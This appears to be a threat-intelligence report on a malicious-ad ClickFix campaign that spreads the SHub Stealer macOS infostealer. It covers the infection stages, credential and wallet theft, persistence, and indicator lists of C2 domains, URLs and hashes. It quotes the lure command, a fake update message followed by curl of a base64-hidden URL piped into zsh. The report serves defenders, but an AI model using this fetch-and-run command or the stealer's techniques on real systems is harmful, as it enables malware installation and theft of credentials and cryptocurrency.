@@ -1,0 +1,118 @@
+2026-03-31 (TUESDAY): Malicious Ads Leading to SHub Stealer & Revealing Newly Registered Domains Leveraged for C2
+
+AUTHOR(S):
+
+- Alex Payne, Jonny Westfall, Brian Janower
+
+NOTES:
+
+- SHub Stealer is a macOS infostealer that targets credentials, browser data, cryptocurrency wallets, and sensitive files.
+- The activity was uncovered during a proactive threat hunting effort focused on detecting outbound connections from Living-off-the-Land Binaries to newly registered domains, as well as through investigations involving multiple infections.
+- Pivoting across multiple telemetry sources led to the identification of 39 C2 domains.
+- The majority of these domains were clean at the time of discovery, highlighting the importance of proactive hunting over reliance on reputation-based detection.
+- Most C2 domains were registered within the last 30 days, indicating rapid infrastructure rotation.
+- Targets Chromium-based browsers (Chrome, Brave, Edge, Arc, Opera) and Firefox — extracting cookies, login data, history, and autofill values.
+- Aggressively targets desktop crypto wallets and browser extension wallets.
+- Extracts Telegram session data (tdata), macOS Keychains, and iCloud account keys.
+
+DETAILS:
+
+- Infection Chain:
+  -- The attack uses a ClickFix social engineering technique. A user searches "install brew on mac" and clicks a sponsored ad.
+  -- The ad leads to a fake Homebrew install guide hosted at:
+     supernotes[.]app
+  -- The site contains fake instructions for installing Homebrew and provides the following command to copy/paste:
+     echo "Downloading Update: hxxps[:]//support[.]apple[.]com/downloads/xprotect-remediator-150.dmg" && curl -s $(echo "aHR0cHM6Ly9[remaining base64 text redacted]" | base64 -d) | zsh
+  -- A fake "Downloading Update" message is displayed to the user, while curl silently pulls data from the base64-encoded variable, which decodes to:
+
+hxxps[:]//octopixeldate[.]com/debug/loader.sh?buildI2f9e58358e8e2bc9e0414fa077e197
+
+- Stage 1 — Loader (loader.sh):
+  -- loader.sh is GunZip/base64 encoded and serves as the initial reconnaissance and delivery stage for SHub Stealer.
+  -- CIS "Kill Switch": Performs geo-fencing by checking if the Russian keyboard layout is enabled. If detected, sends a cis_blocked event to the C2 and exits — ensuring endpoints within CIS (The Commonwealth of Independent States) are not targeted.
+  -- System Profiling: Collects keyboard layouts, hostname, macOS version, and external IP (via ipify, icanhazip, ifconfig.me).
+  -- Telemetry Exfiltration: Sends collected data as JSON to the C2 API endpoint (hxxps[:]//octopixeldate[.]com/api/debug/event), including a hardcoded build_hash identifying the campaign.
+  -- Payload Execution: Silently fetches and executes the second-stage AppleScript payload via osascript. SHub is pulled from:
+     hxxps[:]//octopixeldate[.]com/debug/payload.applescript
+
+- Stage 2 — AppleScript Payload (SHub Stealer):
+  -- SHub performs data collection/exfiltration, establishes persistence, wallet injection, C2 communication, and displays a deception message relaying a "failed" install to the user.
+  -- Kills Terminal to close the window that launched the infection.
+  -- Collects victim info (username, hostname, macOS version, external IP) and sends telemetry to a secondary C2 domain.
+  -- Steals credentials and sensitive files: prompts for macOS password via a fake dialog, validates with dscl, reads Chrome password material from Keychain, copies browser cookies, login DBs, key stores, history, Notes DB, Safari data, shell history, .gitconfig, Telegram data (tdata), Keychains, and iCloud account data.
+  -- Targets Chromium-based browsers (Chrome, Brave, Edge, Arc, Opera) and Firefox — extracting cookies, login data, history, and autofill values.
+  -- Targets cryptocurrency wallets: scans Chromium extension folders for wallet extension IDs and targets desktop wallets including Exodus, Electrum, Atomic, Guarda, Coinomi, Sparrow, Wasabi, Bitcoin Core, Monero, Ledger, and Trezor.
+  -- Establishes persistence via a fake GoogleUpdate LaunchAgent (com.google.keystone.agent.plist, runs every 60 seconds) and tampers with wallet apps by downloading replacement app.asar payloads for Exodus, Atomic Wallet, Ledger Wallet, Ledger Live, and Trezor Suite.
+  -- Exfiltrates collected data via secondary C2 domain
+
+
+INDICATORS:
+
+Domains:
+
+- avafex[.]com
+- beltoxer[.]com
+- benefasts-fhgs2[.]com
+- bigbossbro777[.]com
+- bintail[.]com
+- bulletproofdomai2n[.]com
+- coco2-hram[.]com
+- datasphere[.]us[.]com
+- fastfilenext[.]com
+- hello-brothers777[.]com
+- hilofet[.]com
+- malkim[.]com
+- metramon[.]com
+- mentaorb[.]com
+- miappl[.]com
+- miklutaur[.]com
+- mikulatur[.]com
+- milbiorb[.]com
+- nibelineed[.]com
+- nibelined[.]com
+- obniltail[.]com
+- octopixeldate[.]com
+- pilautfile[.]com
+- quantumdataserver5[.]homes
+- rapidfilevault4[.]cyou
+- rapidfilevault4[.]sbs
+- rapidfilevault5[.]sbs
+- reews09weernsus[.]com
+- reews09weersus[.]com
+- res2erch-sl0ut[.]com
+- res2erch-sl2ut[.]com
+- res2erzch-sl2ut[.]com
+- rhymbil[.]com
+- seagalnssteavens[.]com
+- terafolt[.]com
+- tri2s-sh7es[.]com
+- us41web[.]live
+- we2luck[.]com
+- wewannaliveinpice[.]com
+- macdev[.]slab[.]com (Malicious Ad - ClickFix Delivery)
+
+URLs:
+
+- share[.]supernotes[.]app/scene+lecture+tooth+pupil (Malicious Ad - ClickFix Infection)
+- hxxps[://]macdev[.]slab[.]com/public/posts/insta-ii-with-termina-i-g40n4aau?shr=6etwxr0gksp2ltctcqv7gom7#ho6l6-next-step (ClickFix Delivery Page)
+- hxxps[:]//datasphere[.]us[.]com/debug/loader.sh (Initial reconnaissance script)
+- hxxps[:]//datasphere[.]us[.]com/debug/payload.applescript (Main SHub Stealer payload)
+- hxxps[:]//datasphere[.]us[.]com/api/debug/event (Telemetry endpoint)
+- hxxps[:]//datasphere[.]us[.]com/gate (Data exfiltration endpoint)
+
+SHA256:
+
+- f02758a235a220f2fa125bb6f45a49e674fd8b91f320a382e8b7017d93afbc74 — SHub Stealer payload (payload.applescript)
+- b9e128e9f5f5cc9af38c981718b796d94245e3898619ecfe20bfe234c6abd60c — Loader script (loader.sh)
+
+Persistence & File Artifacts:
+
+- ~/Library/LaunchAgents/com.google.keystone.agent.plist — Persistence mechanism (LaunchAgent)
+- ~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate — Malicious persistence binary
+- /tmp/shub_log.zip — Staged exfiltration archive
+
+Targeted Crypto Wallet Paths (app.asar replacement):
+
+- /Applications/Exodus.app/Contents/Resources/app.asar
+- /Applications/Ledger Live.app/Contents/Resources/app.asar
+- /Applications/Trezor Suite.app/Contents/Resources/app.asar
